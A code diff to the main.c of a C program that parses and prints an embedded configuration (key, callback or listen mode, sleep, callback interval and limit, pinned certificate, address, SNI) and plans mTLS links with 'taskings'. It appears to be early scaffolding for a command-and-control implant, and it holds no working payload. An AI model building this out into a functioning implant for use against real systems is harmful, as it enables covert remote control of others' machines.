@@ -1,12 +1,54 @@
 #include <stdio.h>
 #include "tls.h"
+#include "patch.h"
 
-#include <unistd.h> // sleep, debug
+/* debug */
+#include <unistd.h>
+void print_config(const stamped_config_t *config)
+{
+    if (NULL == config)
+    {
+        return;
+    }
+
+    printf("key:         0x%02X\n", config->key);
+    printf("mode:        %u (%s)\n", config->mode, config->mode == CALLBACK ? "CALLBACK" : "LISTEN");
+    printf("sleep:       %u\n", config->sleep);
+    printf("port:        %u\n", config->port);
+    printf("interval:    %u\n", config->interval);
+    printf("max_cb:      %u\n", config->max_cb);
+
+    printf("spki:        ");
+    for (uint64_t i = 0; i < config->spki.len; i++)
+    {
+        printf("%02X", config->spki.data[i]);
+    }
+    printf("\n");
+
+    printf("address:     %.*s\n", (int)config->address.len, config->address.data);
+    printf("sni:         %.*s\n", (int)config->sni.len, config->sni.data);
+
+    printf("public_key:  %llu bytes\n", (unsigned long long)config->public_key.len);
+    printf("private_key: %llu bytes\n", (unsigned long long)config->private_key.len);
+}
+/* end debug */
 
 int main()
 {
-    tls_conn_t *cxt = tls_new();
+    /* extract embedded configuration to perform tls connection */
+    stamped_config_t config = {0};
+    if (!parse_config(&config))
+    {
+        printf("unable to extract config");
+        return -1;
+    }
 
+    /* debug */
+    print_config(&config);
+    /* end debug */
+
+    /* create temporary debug connection */
+    tls_conn_t *cxt = tls_new();
     if (NULL == cxt)
     {
         return 1;
@@ -32,10 +74,11 @@ int main()
     return 0;
 }
 
-// todo: need to develop the support for both listener and/or client modes. keep this in mind, most likely once connection is made, create custom session structure, that then gets supplied to a thread that performs tasking, etc.
-// todo: hostname and address need to be different or should at least be able to be different as we connect to ip, but cert name is for cert, etc. (if not provided, match values)
+// todo: modify tls structures to take in the config structure rather than host and port, tls will need to decode values before use, etc.
+// todo: once client <-> server are working with mtls, perform small echo and then start taskings
+
+// main.c is purely debug really, will reorg once mtls has been built
+
 // todo: work on poll to provide both static and dynamic arrays, currently only supports static
-// todo: get client <-> server comms working -- then add taskings
 // todo: create root build.sh that will eventually wrap the build_deps.sh and perform all in one go
 // todo: work on mbedtls custom config, mbedtls/mbedtls_config.h, to reduce algos, etc.
-// todo: when testing self signed, ensure cn is a valid name since that will be checked
